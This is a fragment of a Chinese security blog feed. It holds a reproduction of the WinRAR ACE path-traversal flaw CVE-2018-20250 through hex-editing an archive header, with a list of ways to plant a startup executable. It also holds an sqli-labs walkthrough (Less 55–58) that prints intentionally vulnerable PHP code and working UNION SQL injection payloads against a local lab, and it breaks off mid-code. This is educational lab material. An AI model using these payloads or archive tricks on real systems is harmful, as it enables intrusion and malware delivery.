      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr><p>已上学一个星期，上学空余期间发现爆出一个新的CVE:（CVE-2018-20250），WinRaR绝对路径穿越漏洞，回到家后立马就开始折腾复现。感觉这洞还是很有趣的<br><img src="http://n.sinaimg.cn/front/87/w1080h607/20190110/2BnJ-hrkkweh6763708.jpg" alt="2BnJ-hrkkweh6763708.jpg"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>漏洞介绍：</p><blockquote><p>近日Check Point团队爆出了一个关于WinRAR存在19年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用WinRAR解压该恶意文件时便会触发漏洞。</p></blockquote><blockquote><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p></blockquote><p>在实战中，往往rar会预装，因此，我们还可以通过该漏洞，绕过UAC。</p><p>复现时参考的文章：<br><a href="https://mp.weixin.qq.com/s?__biz=Mzg5MTA3NTg2MA==&amp;mid=2247483812&amp;idx=1&amp;sn=91a32ac6a6eeb62798e08cbb74016042&amp;chksm=cfd3addff8a424c9e25ee4b8c66ff62926a439ac840d9f19d7b98c5b2469e665d1a65d495dff&amp;mpshare=1&amp;scene=23&amp;srcid=0222asR3sUEY3lBrRzpzWhUw#rd" target="_blank" rel="noopener">实战!打造WinRAR代码执行漏洞的种植EXP</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247484092&amp;idx=1&amp;sn=1ef9fae081c64650b17722cc9f42cff1&amp;chksm=ea3f3e6edd48b77829abf8ea05dc615bc9424e90b73ab2feb5e76697abb2b61e0e53e46f8327&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank" rel="noopener">【漏洞预警】WinRAR代码执行漏洞复现</a></p><p>需要准备的工具：</p><pre><code>010 Editor 下载地址：http://www.sweetscape.com/download/010editor/download_010editor_win64.htmlWinAce Archiver</code></pre><p>随便用WinAce Archiver打包个东西<br><img src="https://s2.ax1x.com/2019/02/22/kfJX6O.png" alt="kfJX6O.png"></p><p>注意打包的时候要选择：store full path<br><img src="https://s2.ax1x.com/2019/02/22/kfJjXD.png" alt="kfJjXD.png"></p><p>打包成ace后将其拉入010 Editor<br><img src="https://s2.ax1x.com/2019/02/22/kfYS7d.png" alt="kfYS7d.png"></p><p>下载：<a href="https://github.com/droe/acefile" target="_blank" rel="noopener">GitHub - droe/acefile: read/test/extract ACE 1.0 and 2.0 archives in pure python</a><br>用于查看文件头部信息<br><img src="https://s2.ax1x.com/2019/02/22/kfYLUs.png" alt="kfYLUs.png"></p><p>然后先说明几个地方<br>filename<br><img src="https://s2.ax1x.com/2019/02/22/kfYO5n.png" alt="kfYO5n.png"></p><p>文件路径的长度<br><img src="https://s2.ax1x.com/2019/02/22/kfYjCq.png" alt="kfYjCq.png"></p><p><img src="https://s2.ax1x.com/2019/02/22/kfYx2V.png" alt="kfYx2V.png"></p><p>hdr_size<br><img src="https://s2.ax1x.com/2019/02/22/kftCb4.png" alt="kftCb4.png"></p><p>hdr_crc<br><img src="https://s2.ax1x.com/2019/02/22/kftFa9.png" alt="kftFa9.png"></p><p><b>复现开始</b><br>先修改filename<br><img src="https://s2.ax1x.com/2019/02/22/kftZ26.png" alt="kftZ26.png"></p><p>修改文件路径的长度<br><img src="https://s2.ax1x.com/2019/02/22/kftnKO.png" alt="kftnKO.png"></p><p>修改hdr_size<br><img src="https://s2.ax1x.com/2019/02/22/kft8PI.png" alt="kft8PI.png"></p><p>修改hdr_cc，先在acefile.py添加一句话<br><img src="https://s2.ax1x.com/2019/02/22/kftUsS.png" alt="kftUsS.png"><br>然后运行，acefile.py<br><img src="https://s2.ax1x.com/2019/02/22/kfNMlV.png" alt="kfNMlV.png"></p><p><img src="https://s2.ax1x.com/2019/02/22/kfNGTJ.png" alt="kfNGTJ.png"></p><p>再见解析发现已经成功而且filename已被修改：<br><img src="https://s2.ax1x.com/2019/02/22/kfNdl6.png" alt="kfNdl6.png"></p><p>解压到当前文件夹你会发现F盘多了个demo1.txt<br><img src="https://s2.ax1x.com/2019/02/22/kfNW1P.md.png" alt="kfNW1P.md.png"></p><h3 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h3><pre><code>1.打包恶意exe将路径改为开机自启2.cmd劫持3.配置邮件社工等等利用工具：https://github.com/WyAtu/CVE-2018-20250</code></pre><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><blockquote><ol><li>升级到最新版本，WinRAR 目前版本是 5.70 Beta 1</li><li>删除UNACEV2.dll文件</li></ol></blockquote><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs-Less 55 -&gt; 60</title>
      <link href="/posts/517258dd.html"/>
      <url>/posts/517258dd.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>今天下午上学，蛋疼啊趁机从sqli-labs Less 55玩到了60关<br><img src="http://pic.happytify.cc/uploads/20180620/46/4648E374CC65w641h405.jpeg" alt=""></p><h2 id="sqli-labs-Less-55-gt-66"><a href="#sqli-labs-Less-55-gt-66" class="headerlink" title="sqli-labs Less 55 -&gt; 66"></a>sqli-labs Less 55 -&gt; 66</h2><hr><p><b>55关</b><br>先看代码：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-55:Challenge-2&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style =&quot;text-align:right&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/right&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include &#39;../sql-connections/sql-connect-1.php&#39;;include &#39;../sql-connections/functions.php&#39;;error_reporting(0);$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects...$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data$times= 14;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column name// Submitting the final answerif(!isset($_POST[&#39;answer_key&#39;])){    // resetting the challenge and repopulating the table .    if(isset($_POST[&#39;reset&#39;]))    {        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;        echo &quot;Redirecting you to main challenge page..........\n&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        //echo &quot;cookie expired&quot;;    }    else    {        // Checking the cookie on the page and populate the table with random value.        if(isset($_COOKIE[&#39;challenge&#39;]))        {            $sessid=$_COOKIE[&#39;challenge&#39;];            //echo &quot;Cookie value: &quot;.$sessid;        }        else        {            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie(&quot;challenge&quot;, $hash, $expire);        }        echo &quot;&lt;br&gt;\n&quot;;        // take the variables        if(isset($_GET[&#39;id&#39;]))        {            $id=$_GET[&#39;id&#39;];            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);            fclose($fp);            //update the counter in database            next_tryy();            //Display attempts on screen.            $tryyy = view_attempts();            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;            //Reset the Database if you exceed allowed attempts.            if($tryyy &gt;=($times+1))            {                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;                echo &quot;Redirecting you to challenge page..........\n&quot;;                echo &quot;&lt;br&gt;\n&quot;;                header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );            }                // Querry DB to get the correct output            $sql=&quot;SELECT * FROM security.users WHERE id=($id) LIMIT 0,1&quot;;            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            if($row)            {                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;                    echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];                echo &quot;&lt;/font&gt;&quot;;            }            else             {                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;//                print_r(mysql_error());                echo &quot;&lt;/font&gt;&quot;;              }        }        else        {            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;        }    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-55.jpg&quot; /&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/div&gt;&lt;?php}else{    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;    $key = addslashes($_POST[&#39;key&#39;]);    $key = mysql_real_escape_string($key);    //echo $key;    //Query table to verify your result    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;    //echo &quot;$sql&quot;;    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());    $row = mysql_fetch_array($result);    if($row)    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;         header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;        header( &quot;refresh:3;url=index.php&quot; );        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>要求还是和之前一样，在指定的次数内完成注入，只是查询语句的闭合方式不同，根据代码所给出的payload</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-55/?id=0)%20union%20select%201,2,3%20--+http://127.0.0.1/sqli-labs-master/Less-55/?id=0)%20union%20select%201,database(),3%20--+http://127.0.0.1/sqli-labs-master/Less-55/?id=0)%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20--+http://127.0.0.1/sqli-labs-master/Less-55/?id=0)%20union%20select%201,(select%20`3`%20from%20(select%201,2,3,4%20union%20select%20*%20from%20wn0dwpqz7m)a%20limit%201,1),3%20--+</code></pre><p>这里我用了刚刚学到的在不知道列名的情况下进行注入的方法快速获得结果就不用跑列名那么麻烦了<br><img src="https://s2.ax1x.com/2019/02/17/ksviJ1.png" alt="ksviJ1.png"></p><p><b>56关</b><br>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-56:Challenge-3&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style =&quot;text-align:right&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/right&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include &#39;../sql-connections/sql-connect-1.php&#39;;include &#39;../sql-connections/functions.php&#39;;error_reporting(0);$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects...$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data$times= 14;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column name// Submitting the final answerif(!isset($_POST[&#39;answer_key&#39;])){    // resetting the challenge and repopulating the table .    if(isset($_POST[&#39;reset&#39;]))    {        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;        echo &quot;Redirecting you to main challenge page..........\n&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        //echo &quot;cookie expired&quot;;    }    else    {        // Checking the cookie on the page and populate the table with random value.        if(isset($_COOKIE[&#39;challenge&#39;]))        {            $sessid=$_COOKIE[&#39;challenge&#39;];            //echo &quot;Cookie value: &quot;.$sessid;        }        else        {            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie(&quot;challenge&quot;, $hash, $expire);        }        echo &quot;&lt;br&gt;\n&quot;;        // take the variables        if(isset($_GET[&#39;id&#39;]))        {            $id=$_GET[&#39;id&#39;];            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);            fclose($fp);            //update the counter in database            next_tryy();            //Display attempts on screen.            $tryyy = view_attempts();            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;            //Reset the Database if you exceed allowed attempts.            if($tryyy &gt;=($times+1))            {                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;                echo &quot;Redirecting you to challenge page..........\n&quot;;                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );                echo &quot;&lt;br&gt;\n&quot;;            }                // Querry DB to get the correct output            $sql=&quot;SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            if($row)            {                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;                    echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];                echo &quot;&lt;/font&gt;&quot;;            }            else             {                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;//                print_r(mysql_error());                echo &quot;&lt;/font&gt;&quot;;              }        }        else        {            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;        }    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-56.jpg&quot; /&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/div&gt;&lt;?php}else{    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;    $key = addslashes($_POST[&#39;key&#39;]);    $key = mysql_real_escape_string($key);    //echo $key;    //Query table to verify your result    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;    //echo &quot;$sql&quot;;    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());    $row = mysql_fetch_array($result);    if($row)    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;         header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;        header( &quot;refresh:3;url=index.php&quot; );        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>要求还是没变，要求在指定次数内注入出key，只是查询语句的闭合方式变了，其他不变,，根据代码给出的payload</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-56/index.php?id=0%27)%20union%20select%201,2,3%20--+http://127.0.0.1/sqli-labs-master/Less-56/index.php?id=0%27)%20union%20select%201,database(),3%20--+http://127.0.0.1/sqli-labs-master/Less-56/index.php?id=0%27)%20union%20select%201,table_name,3%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20--+http://127.0.0.1/sqli-labs-master/Less-56/index.php?id=0%27)%20union%20select%201,(select%20`3`%20from%20(select%201,2,3,4%20union%20select%20*%20from%20xtdqbkon6c)a%20limit%201,1),3%20--+</code></pre><p><img src="https://s2.ax1x.com/2019/02/17/ksv0Wq.md.png" alt="ksv0Wq.md.png"></p><p><b>57关</b><br>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-57:Challenge-4&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style =&quot;text-align:right&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/right&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include &#39;../sql-connections/sql-connect-1.php&#39;;include &#39;../sql-connections/functions.php&#39;;error_reporting(0);$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects...$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data$times= 14;$table = table_name();$col = column_name(1);     // session id column name$col1 = column_name(2);   //secret key column name// Submitting the final answerif(!isset($_POST[&#39;answer_key&#39;])){    // resetting the challenge and repopulating the table .    if(isset($_POST[&#39;reset&#39;]))    {        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;        echo &quot;Redirecting you to main challenge page..........\n&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        //echo &quot;cookie expired&quot;;    }    else    {        // Checking the cookie on the page and populate the table with random value.        if(isset($_COOKIE[&#39;challenge&#39;]))        {            $sessid=$_COOKIE[&#39;challenge&#39;];            //echo &quot;Cookie value: &quot;.$sessid;        }        else        {            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie(&quot;challenge&quot;, $hash, $expire);        }        echo &quot;&lt;br&gt;\n&quot;;        // take the variables        if(isset($_GET[&#39;id&#39;]))        {            $id=$_GET[&#39;id&#39;];            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);            fclose($fp);            //update the counter in database            next_tryy();            //Display attempts on screen.            $tryyy = view_attempts();            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;            //Reset the Database if you exceed allowed attempts.            if($tryyy &gt;=($times+1))            {                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;                echo &quot;Redirecting you to challenge page..........\n&quot;;                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );                echo &quot;&lt;br&gt;\n&quot;;            }                $id= &#39;&quot;&#39;.$id.&#39;&quot;&#39;;            // Querry DB to get the correct output            $sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            if($row)            {                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;                    echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];                echo &quot;&lt;/font&gt;&quot;;            }            else             {                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;//                print_r(mysql_error());                echo &quot;&lt;/font&gt;&quot;;              }        }        else        {            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;        }    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-57.jpg&quot; /&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/div&gt;&lt;?php}else{    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;    $key = addslashes($_POST[&#39;key&#39;]);    $key = mysql_real_escape_string($key);    //echo $key;    //Query table to verify your result    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;    //echo &quot;$sql&quot;;    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());    $row = mysql_fetch_array($result);    if($row)    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;         header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;        header( &quot;refresh:3;url=index.php&quot; );        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;              }    }?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>要求还是没变，在指定的次数获取key，根据代码给出payload，这个作者在把$id带入sql查询之前偷偷加了个”，滴滴，抓起来锤<br><img src="https://s2.ax1x.com/2019/02/17/ksvb0e.png" alt="ksvb0e.png"></p><pre><code>http://127.0.0.1/sqli-labs-master/Less-57/index.php?id=0%22%20union%20select%201,2,3%20--+http://127.0.0.1/sqli-labs-master/Less-57/index.php?id=0%22%20union%20select%201,database(),3%20--+http://127.0.0.1/sqli-labs-master/Less-57/index.php?id=0%22%20union%20select%201,table_name,3%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20--+http://127.0.0.1/sqli-labs-master/Less-57/index.php?id=0%22%20union%20select%201,(select%20`3`%20from%20(select%201,2,3,4%20union%20select%20*%20from%205tblzh9088)a%20limit%201,1),3%20--+</code></pre><p><img src="https://s2.ax1x.com/2019/02/17/ksvxpt.md.png" alt="ksvxpt.md.png"></p><p><b>58关</b><br>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-58:Challenge-5&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style =&quot;text-align:right&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/right&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include &#39;../sql-connections/sql-connect-1.php&#39;;include &#39;../sql-connections/functions.php&#39;;error_reporting(0);$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects...$characters = 